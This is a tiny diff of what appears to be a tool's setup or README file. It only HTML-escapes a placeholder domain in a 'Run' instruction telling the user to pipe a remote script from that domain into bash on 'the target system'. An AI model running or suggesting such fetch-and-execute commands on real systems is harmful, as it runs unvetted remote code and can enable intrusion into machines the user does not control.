@@ -12,5 +12,5 @@ Setup:
 
 Run:
 To execute the dtxt run the following command on the target system:
-curl -s http://<domain.com>/dtxt/d.txt | bash 
+curl -s http://&lt;domain.com&gt;/dtxt/d.txt | bash 
 
